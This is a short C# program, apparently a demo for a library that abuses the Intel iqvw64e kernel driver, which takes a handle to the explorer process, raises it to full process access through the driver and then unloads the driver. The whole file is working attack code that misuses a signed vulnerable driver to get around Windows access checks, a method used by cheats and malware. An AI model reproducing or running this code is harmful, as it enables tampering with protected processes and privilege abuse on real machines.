using System.Diagnostics;
using iHaek.iqvw64e;

Console.Title = @"Intel handle access elevation (kernel)";

var processes = Process.GetProcessesByName("explorer");
var handle = (ulong)processes[0].Handle;

var handleElevator = new ElevateHandle();

var desiredAccess = 0x001F0FFF; /* All - ProcessAccessFlags */

if (handleElevator.SuccessfullyInited)
    try
    {
        var elevateResult = handleElevator.Elevate(handle, desiredAccess);
        if (elevateResult)
            Console.WriteLine(@"[+] Handle successfully elevated!");
        else
            throw new Exception("Something went wrong with handle elevating!");
    }
    catch (Exception ex)
    {
        Console.WriteLine($@"[!] Cant elevate handle! - Message: ""{ex.Message}""");
    }

Console.WriteLine(@"[*] Press any key to unload the driver");
Console.ReadKey();

var unloadResult = Wrapper.UnloadDriver();
Console.WriteLine(!unloadResult ? "[!] Couldn't unload driver!" : "[+] Driver unloaded and disposed");